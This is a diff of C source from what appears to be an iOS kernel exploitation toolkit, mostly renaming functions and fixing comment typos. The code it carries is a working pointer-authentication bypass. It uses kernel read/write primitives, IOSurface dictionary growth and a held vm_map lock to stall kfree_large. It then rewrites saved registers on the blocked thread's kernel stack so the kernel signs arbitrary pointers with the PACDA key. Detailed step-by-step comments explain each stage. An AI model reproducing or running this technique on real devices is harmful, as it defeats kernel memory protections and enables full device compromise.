@@ -166,7 +166,7 @@
 //  0xfffffe00079212fc      mov       x0, x16
 //  ...
 //  0xfffffe000792130c      mov       w8, w9
-/// // Set arg3 = `OSDictionary::count` * sizeof(dictEntry)
+/// // Set arg3 = `OSDictionary::count * sizeof(dictEntry)`
 //  0xfffffe0007921310      lsl       x2, x8, #0x4
 /// // Set arg1 = kalloc_type_view
 //  0xfffffe0007921314      adrp      x0, -0x1fff8db8000
@@ -205,10 +205,10 @@
 /// size of memory is greater than or equal to `kalloc_max_prerounded`, the method `kfree_large`
 /// is used to release the allocated memory. The method `kfree_large` will call `kmem_free` when
 /// the caller has provided the size of memory to be freed (OSDictionary::ensureCapacity do provide
-/// the size of allocated memory as 3rd argument to `kalloc_max_prerounded` which will get passed
-/// down to `kfree_large`). The `kmem_free` method will cal `vm_map_remove` to remove the
-/// memory region from the `vm_map` used during allocation. The `vm_map_remove` will call
-/// `vm_map_lock` macro which calls `lck_rw_lock_exclusive` method to acquire exlusive lock on
+/// the size of allocated memory as 3rd argument to `kfree_type_var_impl_internal` which will get
+/// passed down to `kfree_large`). The `kmem_free` method will cal `vm_map_remove` to remove
+/// the memory region from the `vm_map` used during allocation. The `vm_map_remove` will call
+/// `vm_map_lock` macro which calls `lck_rw_lock_exclusive` method to acquire exclusive lock on
 /// `&map->lock`. Since we have `utils/lck_rw.c` utility for acquring and releasing arbitary read-write
 /// locks in kernel memory, we can reliably pause the execution of `vm_map_remove` method and
 /// make it wait for `&map->lock` to be released. So now we know we can reliably modify kernel
@@ -263,8 +263,8 @@
 //  ...
 //
 /// So we cannot change the values of those regisers from stack used by `kfree_ext`. The method
-/// `kfree_large` do save x21 on to kernel stack and restores its value from stack only  when the
-/// method returns. This allows us to change the value of x21 when `kfree_large` returns by modify
+/// `kfree_large` do save x21 on to kernel stack and restores its value from stack only when the
+/// method returns. This allows us to change the value of x21 when `kfree_large` returns by modifying
 /// the kernel stack used by `kfree_large`
 ///
 //  void kfree_large(kalloc_heap_t kheap, vm_offset_t addr, vm_size_t size)
@@ -275,7 +275,7 @@
 //  0xfffffe00072b8400     stp        x20, x19, [sp, #0x60]
 //  0xfffffe00072b8404     stp        x29, x30, [sp, #0x70]
 //   ...
-/// // kmem_free method called with branch link instruction
+/// // kmem_free method called using branch link instruction
 //  0xfffffe00072b84b4     bl         kmem_free
 //  ...
 //  0xfffffe00072b8614     ldp        x29, x30, [sp, #0x70]
@@ -315,16 +315,18 @@
 ///
 /// So now since we know we can control values of `x21` and `x23` by modifying kernel stack, we
 /// can use this method to sign arbitary pointers with arbitary context using `DA` pointer
-/// authentication key. See the implementation below for more details.
+/// authentication key.
+///
+/// See the implementation below for more details.
 ///
 
 
 #define LR_OS_DICT_ENSURE_CAPACITY_KFREE_OFFSET 0x24c
-#define KALLOC_MAP_SWITCH_CAPACITY (xpl_PAGE_SIZE * 3 / 16)
-#define KERNEL_MAP_SWITCH_CAPACITY (xpl_PAGE_SIZE * 64 / 16)
+#define KALLOC_MAP_SWITCH_CAPACITY (XPL_PAGE_SIZE * 3 / 16)
+#define KERNEL_MAP_SWITCH_CAPACITY (XPL_PAGE_SIZE * 64 / 16)
 
 
-void xpl_util_pacda_io_surface_add_values(IOSurfaceRef surface, size_t idx_start, size_t count) {
+void xpl_pacda_io_surface_add_values(IOSurfaceRef surface, size_t idx_start, size_t count) {
     CFMutableDictionaryRef dict = CFDictionaryCreateMutable(kCFAllocatorDefault, count, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
     for (size_t i=0; i<count; i++) {
         char name[NAME_MAX];
@@ -339,17 +341,17 @@ void xpl_util_pacda_io_surface_add_values(IOSurfaceRef surface, size_t idx_start
 
 /// This is a faster method to grow the size of `OSDictionary::dictionary` array than growing by
 /// adding values using `IOSurfaceSetValue` method
-void xpl_util_pacda_prepare_dict_for_switch(IOSurfaceRef surface, uintptr_t dict, uint32_t desired_capacity) {
-    xpl_assert_cond((desired_capacity * 16) % xpl_PAGE_SIZE, ==, 0);
+void xpl_pacda_prepare_dict_for_switch(IOSurfaceRef surface, uintptr_t dict, uint32_t desired_capacity) {
+    xpl_assert_cond((desired_capacity * 16) % XPL_PAGE_SIZE, ==, 0);
     uint32_t current_capacity = xpl_kmem_read_uint32(dict, TYPE_OS_DICTIONARY_MEM_CAPACITY_OFFSET);
     uint32_t current_count = xpl_kmem_read_uint32(dict, TYPE_OS_DICTIONARY_MEM_COUNT_OFFSET);
     xpl_assert_cond(desired_capacity, >, current_capacity);
     
-    /// Update the `OSDictionary::count` to `OSDictionary::capacity - 1`
+    /// Update the `OSDictionary::count` to `OSDictionary::capacity`
     /// This will make sure that adding one more unique key to the dictionary will require
     /// growing the `dictionary` array using `OSDictionary::ensureCapacity` method
     int diff = current_capacity - current_count;
-    xpl_util_pacda_io_surface_add_values(surface, current_count, diff);
+    xpl_pacda_io_surface_add_values(surface, current_count, diff);
     
     /// Set the `OSDictionary::capacityIncrement` value to desired capacity. This value is
     /// used by `OSDictionary::ensureCapacity` to calculate the capacity of new `dictionary` array
@@ -357,25 +359,25 @@ void xpl_util_pacda_prepare_dict_for_switch(IOSurfaceRef surface, uintptr_t dict
 }
 
 
-void xpl_util_pacda_prepare_surface_for_switch(IOSurfaceRef surface_ref, uintptr_t surface) {
+void xpl_pacda_prepare_surface_for_switch(IOSurfaceRef surface_ref, uintptr_t surface) {
     uintptr_t dict = xpl_kmem_read_ptr(surface, TYPE_IOSURFACE_MEM_PROPS_OFFSET);
     
-    /// Update the `props` dictionary of IOSurface to make it array `OSDictionary::dictionary`
-    /// large enough to be allocated from `KHEAP_DEFAULT->kh_large_map`
-    xpl_util_pacda_prepare_dict_for_switch(surface_ref, dict, KALLOC_MAP_SWITCH_CAPACITY);
+    /// Update the `props` dictionary of IOSurface to make its `OSDictionary::dictionary` array
+    /// is large enough to be allocated from `KHEAP_DEFAULT->kh_large_map`
+    xpl_pacda_prepare_dict_for_switch(surface_ref, dict, KALLOC_MAP_SWITCH_CAPACITY);
     uint32_t count = xpl_kmem_read_uint32(dict, TYPE_OS_ARRAY_MEM_COUNT_OFFSET);
-    xpl_util_pacda_io_surface_add_values(surface_ref, count, 1);
+    xpl_pacda_io_surface_add_values(surface_ref, count, 1);
     
     /// Update the `props` dictionary of IOSurface such that adding one more unique key
-    /// to the dictionary will lead to allocation of array `OSDictionary::dictionary` from
+    /// to the dictionary will require allocation of `OSDictionary::dictionary` array from
     /// `KHEAP_DEFAULT->kh_fallback_map`
-    xpl_util_pacda_prepare_dict_for_switch(surface_ref, dict, KERNEL_MAP_SWITCH_CAPACITY);
+    xpl_pacda_prepare_dict_for_switch(surface_ref, dict, KERNEL_MAP_SWITCH_CAPACITY);
 }
 
 
-uintptr_t xpl_util_pacda_sign(uintptr_t ptr, uint64_t ctx) {
+uintptr_t xpl_pacda_sign(uintptr_t ptr, uint64_t ctx) {
     uintptr_t lr_kfree = xpl_slider_kernel_slide(FUNC_OS_DICTIONARY_ENSURE_CAPACITY_ADDR) + LR_OS_DICT_ENSURE_CAPACITY_KFREE_OFFSET;
-    xpl_assert_cond(xpl_kmem_read_uint32(lr_kfree - 4, 0), ==, xpl_util_asm_build_bl_instr(xpl_slider_kernel_slide(FUNC_KFREE_TYPE_VAR_IMPL_INTERNAL_ADDR), lr_kfree - 4))
+    xpl_assert_cond(xpl_kmem_read_uint32(lr_kfree - 4, 0), ==, xpl_asm_build_bl_instr(xpl_slider_kernel_slide(FUNC_KFREE_TYPE_VAR_IMPL_INTERNAL_ADDR), lr_kfree - 4))
     
     xpl_log_debug("signing pointer %p with context %p", (void*)ptr, (void*)ctx);
     
@@ -383,33 +385,33 @@ uintptr_t xpl_util_pacda_sign(uintptr_t ptr, uint64_t ctx) {
     uintptr_t kalloc_map = xpl_kmem_read_uint64(kheap_default, TYPE_KALLOC_HEAP_MEM_KH_LARGE_MAP_OFFSET);
     uintptr_t kalloc_map_lck = kalloc_map + TYPE_VM_MAP_MEM_LCK_RW_OFFSET;
     
-    xpl_util_lck_rw_t util_lck_rw = NULL;
+    xpl_lck_rw_t util_lck_rw = NULL;
     
     /// STEP 1: Allocate a new IOSurface. We will be using the `props` dictionary used by
-    /// IOSurface to store values provided by `IOSurfaceSetValue` to sign pointers using method
-    /// discussed above.
+    /// IOSurface to store values provided by `IOSurfaceSetValue` method to sign pointers
+    /// using method discussed above.
     uintptr_t surface;
     IOSurfaceRef surface_ref = xpl_io_surface_create(&surface);
     
     /// STEP 2: Adjust the capacity of the `props` dictionary such that adding one more unique
-    /// key to it will trigger  `OSDictionary::ensureCapacity` which will allocate a new
+    /// key to it will trigger `OSDictionary::ensureCapacity` which will have to allocate a new
     /// `OSDictionary::dictionary` array from `KHEAP_DEFAULT.kh_fallback_map` and release
     /// the old `OSDictionary::dictionary` array allocated from `KHEAP_DEFAULT.kh_large_map`
     ///
     /// This is required because both allocation and free of memory from vm_map will require
     /// acquiring its rw lock `map->lock`. Since we want to pause the execution of `kfree_type`
-    /// and not `kallocp_type_tag_bt` we want both methods to use different `vm_map` for
+    /// and not `kallocp_type_tag_bt` we want these methods to use different `vm_map` for
     /// release / allocation.
-    xpl_util_pacda_prepare_surface_for_switch(surface_ref, surface);
+    xpl_pacda_prepare_surface_for_switch(surface_ref, surface);
     
     /// STEP 3: Acquire exclusive lock on `KHEAP_DEFAULT.kh_large_map`
-    util_lck_rw = xpl_util_lck_rw_lock_exclusive(kalloc_map_lck);
+    util_lck_rw = xpl_lck_rw_lock_exclusive(kalloc_map_lck);
     
     uintptr_t* waiting_thread = alloca(sizeof(uintptr_t));
     dispatch_semaphore_t sem_add_value_start = dispatch_semaphore_create(0);
     dispatch_semaphore_t sem_add_value_complete = dispatch_semaphore_create(0);
     
-    /// STEP 4: Add one more unique key `props` dictionary in separate background thread.
+    /// STEP 4: Add one more unique key to `props` dictionary in separate background thread.
     /// This thread will be kept blocked until lock acquired in STEP 3 is released
     dispatch_async(xpl_dispatch_queue(), ^() {
         *waiting_thread = xpl_xnu_thread_current_thread();
@@ -419,10 +421,10 @@ uintptr_t xpl_util_pacda_sign(uintptr_t ptr, uint64_t ctx) {
         /// `KHEAP_DEFAULT.kh_fallback_map`. Then it will copy all the keys and values
         /// from existing `OSDictionary::dictionary` array to the newly allocated array. Then
         /// it will try to release the old `OSDictionary::dictionary` array. Since the old array
-        /// is allocated from `KHEAP_DEFAULT.kh_large_map` and the since we have
+        /// is allocated from `KHEAP_DEFAULT.kh_large_map` and since we have
         /// acquired the lock of this `vm_map` in STEP 3, this method will be blocked until
         /// the lock aquired in STEP 3 is released
-        xpl_util_pacda_io_surface_add_values(surface_ref, KERNEL_MAP_SWITCH_CAPACITY - 1, 1);
+        xpl_pacda_io_surface_add_values(surface_ref, KERNEL_MAP_SWITCH_CAPACITY - 1, 1);
         dispatch_semaphore_signal(sem_add_value_complete);
     });
     
@@ -435,14 +437,14 @@ uintptr_t xpl_util_pacda_sign(uintptr_t ptr, uint64_t ctx) {
     /// This method also sets the value of `lr_lck_rw_excl_gen_stack_ptr` to location in
     /// waiting thread kernel stack where the link register for branch with link call to
     /// `lck_rw_lock_exclusive_gen` method from `lck_rw_lock_exclusive` method is stored
-    int error = xpl_util_lck_rw_wait_for_contention(util_lck_rw, *waiting_thread, &lr_lck_rw_excl_gen_stack_ptr);
+    int error = xpl_lck_rw_wait_for_contention(util_lck_rw, *waiting_thread, &lr_lck_rw_excl_gen_stack_ptr);
     xpl_assert_err(error);
     
     /// STEP 6: Scan the kernel stack of background thread created in STEP 4 to find the
     /// location where link register for branch with link call to `kfree_type_var_impl_internal`
     /// method from `OSDictionary::ensureCapacity` method is stored
     uintptr_t lr_kfree_stack_ptr;
-    error = xpl_xnu_thread_scan_stack(*waiting_thread, lr_kfree, xpl_PTRAUTH_MASK, 1024, &lr_kfree_stack_ptr);
+    error = xpl_xnu_thread_scan_stack(*waiting_thread, lr_kfree, XPL_PTRAUTH_MASK, 1024, &lr_kfree_stack_ptr);
     xpl_assert_err(error);
     
     uintptr_t x19 = lr_kfree_stack_ptr - 0x10; // dict
@@ -461,13 +463,13 @@ uintptr_t xpl_util_pacda_sign(uintptr_t ptr, uint64_t ctx) {
     /// the updated capacity of `props` dictionary and this values is returned by `ensureCapacity`
     /// method. Setting this value to zero makes sure that the pointer in `OSDictionary::dictionary`
     /// will not be used by caller `OSDictionary::setObject` when `ensureCapacity` returns
-    /// (Using it panic sinces its value is invalid due to modified x21 and x23)
+    /// (Using it will panic since its value is invalid due to modified x21 and x23)
     xpl_kmem_write_uint64(x20, 0, 0);
     
     /// STEP 9: Release the lock acquired in STEP 3. This will unblock the background thread
     /// used in STEP 4 and the value of `OSDictionary::dictionary` will have the required PACDA
     /// signed value
-    xpl_util_lck_rw_lock_done(&util_lck_rw);
+    xpl_lck_rw_lock_done(&util_lck_rw);
     dispatch_semaphore_wait(sem_add_value_complete, DISPATCH_TIME_FOREVER);
     dispatch_release(sem_add_value_complete);
     
@@ -486,6 +488,6 @@ uintptr_t xpl_util_pacda_sign(uintptr_t ptr, uint64_t ctx) {
     return signed_ptr;
 }
 
-uintptr_t xpl_util_pacda_sign_with_descriminator(uintptr_t ptr, uintptr_t ctx, uint16_t descriminator) {
-    return xpl_util_pacda_sign(ptr, xpl_ptrauth_blend_discriminator_with_address(descriminator, ctx));
+uintptr_t xpl_pacda_sign_with_descriminator(uintptr_t ptr, uintptr_t ctx, uint16_t descriminator) {
+    return xpl_pacda_sign(ptr, xpl_ptrauth_blend_discriminator_with_address(descriminator, ctx));
 }
